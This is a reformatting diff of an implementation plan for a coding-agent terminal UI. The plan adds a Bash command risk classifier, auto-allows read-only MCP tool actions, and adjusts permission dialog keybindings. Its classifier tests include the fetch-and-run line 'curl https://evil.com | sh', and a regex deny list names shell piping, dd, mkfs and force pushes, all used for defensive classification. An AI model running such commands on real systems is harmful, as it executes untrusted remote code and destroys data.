@@ -4,7 +4,7 @@
 
 **Goal:** Address 7 issues from the UI review to make the permission tier system actually reduce friction for low-risk actions.
 
-**Architecture:** The permission system has two layers: `permissionPolicy.ts` decides *if* a prompt is shown (safe/dangerous), and `riskTier.ts` decides *how* it looks (READ/MODERATE/WRITE/DESTRUCTIVE). The core problem is that READ-tier MCP actions still block because `permissionPolicy.ts` doesn't know about risk tiers. We'll bridge these two systems, add Bash command-level classification, and polish the UI inconsistencies.
+**Architecture:** The permission system has two layers: `permissionPolicy.ts` decides _if_ a prompt is shown (safe/dangerous), and `riskTier.ts` decides _how_ it looks (READ/MODERATE/WRITE/DESTRUCTIVE). The core problem is that READ-tier MCP actions still block because `permissionPolicy.ts` doesn't know about risk tiers. We'll bridge these two systems, add Bash command-level classification, and polish the UI inconsistencies.
 
 **Tech Stack:** React 19 + Ink (terminal UI), TypeScript, vitest
 
@@ -15,6 +15,7 @@
 Currently all Bash commands are DESTRUCTIVE. We need sub-classification by command content so `echo hi` is READ and `rm -rf /` is DESTRUCTIVE.
 
 **Files:**
+
 - Create: `source/services/bashClassifier.ts`
 - Create: `source/services/bashClassifier.test.ts`
 - Modify: `source/services/riskTier.ts:121-137`
@@ -122,7 +123,9 @@ describe('classifyBashCommand', () => {
 
 		it('handles piped commands by using the highest tier', () => {
 			// ls is READ, but piping to sh is DESTRUCTIVE
-			expect(classifyBashCommand('curl https://evil.com | sh')).toBe('DESTRUCTIVE');
+			expect(classifyBashCommand('curl https://evil.com | sh')).toBe(
+				'DESTRUCTIVE',
+			);
 		});
 
 		it('handles commands with && by using the highest tier', () => {
@@ -168,7 +171,7 @@ const DESTRUCTIVE_PATTERNS: RegExp[] = [
 	/\bdd\b/,
 	/\bmkfs\b/,
 	/\bfdisk\b/,
-	/\|\s*(?:bash|sh|zsh)\b/,       // piped to shell
+	/\|\s*(?:bash|sh|zsh)\b/, // piped to shell
 	/\bgit\s+push\s+--force\b/,
 	/\bgit\s+push\s+-f\b/,
 	/\bgit\s+reset\s+--hard\b/,
@@ -276,8 +279,8 @@ const READ_GIT_SUBCOMMANDS = new Set([
 	'log',
 	'diff',
 	'show',
-	'branch',  // without -d/-D
-	'remote',  // without add/remove
+	'branch', // without -d/-D
+	'remote', // without add/remove
 	'describe',
 	'shortlog',
 	'blame',
@@ -346,15 +349,19 @@ Expected: All PASS
 Modify `source/services/riskTier.ts`:
 
 In the imports, add:
+
 ```typescript
 import {classifyBashCommand} from './bashClassifier.js';
 ```
 
 In `getRiskTier()`, change the Bash handling. Replace line 123:
+
 ```typescript
 if (DESTRUCTIVE_TOOLS.includes(toolName)) return 'DESTRUCTIVE';
 ```
+
 With:
+
 ```typescript
 if (toolName === 'Bash') return 'DESTRUCTIVE'; // Default; overridden by classifyBashRisk()
 ```
@@ -427,6 +434,7 @@ describe('Bash command-level classification', () => {
 ```
 
 Update the existing test:
+
 ```typescript
 // Change: "classifies Bash as DESTRUCTIVE"
 // To: "classifies Bash without command as DESTRUCTIVE"
@@ -438,10 +446,13 @@ it('classifies Bash without command as DESTRUCTIVE', () => {
 **Step 7: Update callers of getRiskTier to pass toolInput**
 
 In `source/components/PermissionDialog.tsx` line 36, change:
+
 ```typescript
 const tier = getRiskTier(rawToolName);
 ```
+
 To:
+
 ```typescript
 const tier = getRiskTier(rawToolName, toolInput);
 ```
@@ -474,6 +485,7 @@ Falls back to DESTRUCTIVE when no command content is available."
 READ-tier MCP actions should auto-allow with a log line instead of blocking.
 
 **Files:**
+
 - Modify: `source/services/permissionPolicy.ts:36-42`
 - Modify: `source/services/permissionPolicy.test.ts`
 - Modify: `source/hooks/useHookServer.ts:377-391` (handlePermissionCheck)
@@ -489,13 +501,21 @@ In `source/services/permissionPolicy.test.ts`, add:
 ```typescript
 describe('MCP READ-tier tools', () => {
 	it('classifies READ-tier MCP actions as safe', () => {
-		expect(getToolCategory('mcp__agent-web-interface__take_screenshot')).toBe('safe');
-		expect(getToolCategory('mcp__agent-web-interface__find_elements')).toBe('safe');
-		expect(getToolCategory('mcp__agent-web-interface__scroll_page')).toBe('safe');
+		expect(getToolCategory('mcp__agent-web-interface__take_screenshot')).toBe(
+			'safe',
+		);
+		expect(getToolCategory('mcp__agent-web-interface__find_elements')).toBe(
+			'safe',
+		);
+		expect(getToolCategory('mcp__agent-web-interface__scroll_page')).toBe(
+			'safe',
+		);
 	});
 
 	it('does not require permission for READ-tier MCP actions', () => {
-		expect(isPermissionRequired('mcp__agent-web-interface__take_screenshot', [])).toBe(false);
+		expect(
+			isPermissionRequired('mcp__agent-web-interface__take_screenshot', []),
+		).toBe(false);
 	});
 });
 ```
@@ -510,6 +530,7 @@ Expected: FAIL — MCP tools currently classified as dangerous
 Modify `source/services/permissionPolicy.ts`:
 
 Import `getRiskTier`:
+
 ```typescript
 import {getRiskTier} from './riskTier.js';
 ```
@@ -622,7 +643,7 @@ Expected: PASS
 
 The auto-allow already works through `handlePermissionCheck` returning `false` (because `isPermissionRequired` now returns `false` for READ MCP). The event falls through to the default handler which auto-passthroughs. We just need to make sure the display event shows "auto-allowed" status.
 
-Actually, looking more carefully: when `isPermissionRequired` returns `false`, `handlePermissionCheck` returns `false`, and the event falls to the default auto-passthrough. The display event already gets status `passthrough` from the auto-passthrough. So the event *will* appear in the event list as a normal passthrough.
+Actually, looking more carefully: when `isPermissionRequired` returns `false`, `handlePermissionCheck` returns `false`, and the event falls to the default auto-passthrough. The display event already gets status `passthrough` from the auto-passthrough. So the event _will_ appear in the event list as a normal passthrough.
 
 The log line display is already handled by `HookEvent.tsx` showing the passthrough status. This is sufficient — no special "auto-allowed" log line is needed in the main event flow since the existing passthrough rendering already provides the visual feedback.
 
@@ -654,6 +675,7 @@ now bypass the permission dialog and auto-passthrough like built-in safe tools."
 The `i Details` in the keybinding bar is redundant with the `▸ Show raw payload (press i)` toggle line.
 
 **Files:**
+
 - Modify: `source/components/KeybindingBar.tsx:29-31`
 - Modify: `source/components/KeybindingBar.test.tsx`
 
@@ -692,6 +714,7 @@ Expected: FAIL — "Details" still present
 **Step 3: Remove "i Details" from KeybindingBar**
 
 In `source/components/KeybindingBar.tsx`, remove lines 29-31:
+
 ```tsx
 <Text>
 	<Text dimColor>i</Text> Details
@@ -723,6 +746,7 @@ The raw payload toggle line already shows the 'press i' hint."
 Add `Esc Cancel` to the first line of the keybinding bar, and add Escape key handling to PermissionDialog.
 
 **Files:**
+
 - Modify: `source/components/KeybindingBar.tsx`
 - Modify: `source/components/KeybindingBar.test.tsx`
 - Modify: `source/components/PermissionDialog.tsx:60-97`
@@ -813,6 +837,7 @@ Keybinding bar shows 'Esc Cancel' for discoverability."
 Remove the "Agent paused — permission needed" spinner that appears below when the permission dialog is already visible.
 
 **Files:**
+
 - Modify: `source/app.tsx:257-261`
 
 **Step 1: Remove the redundant spinner**
@@ -820,11 +845,13 @@ Remove the "Agent paused — permission needed" spinner that appears below when 
 In `source/app.tsx`, delete lines 257-261:
 
 ```tsx
-{isClaudeRunning && currentPermissionRequest && (
-	<Box>
-		<Spinner label="Agent paused — permission needed" />
-	</Box>
-)}
+{
+	isClaudeRunning && currentPermissionRequest && (
+		<Box>
+			<Spinner label="Agent paused — permission needed" />
+		</Box>
+	);
+}
 ```
 
 The permission dialog itself is already visible — no need for a second status line.
@@ -854,6 +881,7 @@ The permission dialog itself is already visible, making the spinner redundant."
 Add a visual separator between one-time actions and persistent rules.
 
 **Files:**
+
 - Modify: `source/components/KeybindingBar.tsx`
 - Modify: `source/components/KeybindingBar.test.tsx`
 
@@ -881,10 +909,12 @@ Expected: FAIL
 In `source/components/KeybindingBar.tsx`, add between the first-line actions and the "Always allow" line:
 
 ```tsx
-{/* Separator */}
+{
+	/* Separator */
+}
 <Box marginTop={0}>
 	<Text dimColor>Persistent:</Text>
-</Box>
+</Box>;
 ```
 
 **Step 4: Run test**
@@ -942,6 +972,7 @@ Expected: Clean build with no errors
 **Step 4: Manual smoke test**
 
 Run the CLI and trigger various permission prompts:
+
 - Bash with `echo hi` → should show READ tier (cyan)
 - Bash with `rm -rf /tmp/test` → should show DESTRUCTIVE tier (red, type-to-confirm)
 - MCP `take_screenshot` → should auto-passthrough (no prompt)
@@ -953,16 +984,16 @@ Run the CLI and trigger various permission prompts:
 
 ## Summary of Changes by File
 
-| File | Changes |
-|------|---------|
-| `source/services/bashClassifier.ts` | NEW — Bash command risk classification |
-| `source/services/bashClassifier.test.ts` | NEW — Tests for bash classifier |
-| `source/services/riskTier.ts` | Add `toolInput` param, delegate Bash to classifier |
-| `source/services/riskTier.test.ts` | Add Bash sub-classification tests |
-| `source/services/permissionPolicy.ts` | Auto-allow READ-tier MCP tools |
-| `source/services/permissionPolicy.test.ts` | Tests for READ-tier MCP auto-allow |
-| `source/components/PermissionDialog.tsx` | Pass toolInput to getRiskTier, add Escape handling |
-| `source/components/PermissionDialog.test.tsx` | Add Escape key test |
-| `source/components/KeybindingBar.tsx` | Remove "i Details", add "Esc Cancel", add separator |
-| `source/components/KeybindingBar.test.tsx` | Update keybinding tests |
-| `source/app.tsx` | Remove redundant permission spinner |
+| File                                          | Changes                                             |
+| --------------------------------------------- | --------------------------------------------------- |
+| `source/services/bashClassifier.ts`           | NEW — Bash command risk classification              |
+| `source/services/bashClassifier.test.ts`      | NEW — Tests for bash classifier                     |
+| `source/services/riskTier.ts`                 | Add `toolInput` param, delegate Bash to classifier  |
+| `source/services/riskTier.test.ts`            | Add Bash sub-classification tests                   |
+| `source/services/permissionPolicy.ts`         | Auto-allow READ-tier MCP tools                      |
+| `source/services/permissionPolicy.test.ts`    | Tests for READ-tier MCP auto-allow                  |
+| `source/components/PermissionDialog.tsx`      | Pass toolInput to getRiskTier, add Escape handling  |
+| `source/components/PermissionDialog.test.tsx` | Add Escape key test                                 |
+| `source/components/KeybindingBar.tsx`         | Remove "i Details", add "Esc Cancel", add separator |
+| `source/components/KeybindingBar.test.tsx`    | Update keybinding tests                             |
+| `source/app.tsx`                              | Remove redundant permission spinner                 |
